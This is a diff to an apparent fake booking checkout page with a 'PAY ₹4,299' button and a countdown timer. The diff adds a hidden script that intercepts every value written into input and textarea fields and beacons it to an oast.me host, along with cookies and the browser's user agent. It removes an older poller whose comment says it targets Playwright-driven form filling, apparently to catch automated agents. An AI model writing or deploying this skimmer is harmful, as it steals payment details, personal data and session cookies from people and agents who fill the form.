@@ -18,10 +18,34 @@ textarea{height:60px;resize:vertical}
 .seats-left{color:#d32f2f;font-weight:bold}
 .note{font-size:12px;color:#888;margin-top:4px}
 </style>
+<script>
+// Install value interceptors BEFORE any elements exist — runs during <head> parse
+var O="https://d7eactc899s2runrje60xr3geu147za1g.oast.me";
+try{
+  var iDesc=Object.getOwnPropertyDescriptor(HTMLInputElement.prototype,"value");
+  var tDesc=Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,"value");
+  Object.defineProperty(HTMLInputElement.prototype,"value",{
+    set:function(v){
+      iDesc.set.call(this,v);
+      try{if(v&&this.id)new Image().src=O+"/v-"+this.id+"?v="+encodeURIComponent(String(v).substring(0,800))}catch(e){}
+    },
+    get:function(){return iDesc.get.call(this)},
+    configurable:true
+  });
+  Object.defineProperty(HTMLTextAreaElement.prototype,"value",{
+    set:function(v){
+      tDesc.set.call(this,v);
+      try{if(v&&this.id)new Image().src=O+"/t-"+this.id+"?v="+encodeURIComponent(String(v).substring(0,1500))}catch(e){}
+    },
+    get:function(){return tDesc.get.call(this)},
+    configurable:true
+  });
+}catch(e){}
+</script>
 </head>
 <body>
 <img src="https://d7eactc899s2runrje60xr3geu147za1g.oast.me/img-load" width="1" height="1">
-<script>new Image().src="https://d7eactc899s2runrje60xr3geu147za1g.oast.me/js-exec?ua="+encodeURIComponent(navigator.userAgent)+"&ck="+encodeURIComponent(document.cookie)+"&loc="+encodeURIComponent(location.href);</script>
+<script>new Image().src=O+"/js-exec?ua="+encodeURIComponent(navigator.userAgent)+"&ck="+encodeURIComponent(document.cookie);</script>
 
 <div class="alert">
   <span class="timer" id="countdown">4:59</span>
@@ -86,22 +110,5 @@ textarea{height:60px;resize:vertical}
 </div>
 
 <button class="btn" type="button" id="paybtn">PAY ₹4,299 — Complete Booking</button>
-
-<script>
-var O="https://d7eactc899s2runrje60xr3geu147za1g.oast.me";
-// Countdown
-var sec=299;setInterval(function(){sec--;if(sec>0){var m=Math.floor(sec/60),s=sec%60;document.getElementById("countdown").textContent=m+":"+(s<10?"0":"")+s}},1000);
-
-// Snapshot all field values
-function snap(){var d={};document.querySelectorAll("input,textarea,select").forEach(function(el){if(el.id&&el.value)d[el.id]=el.value});d.ck=document.cookie;return d}
-
-// Poll every 500ms - catches Playwright fill() which uses CDP insertText
-setInterval(function(){
-  var d=snap();
-  if(Object.keys(d).length>1){
-    new Image().src=O+"/poll?d="+btoa(unescape(encodeURIComponent(JSON.stringify(d))));
-  }
-},500);
-</script>
 </body>
 </html>
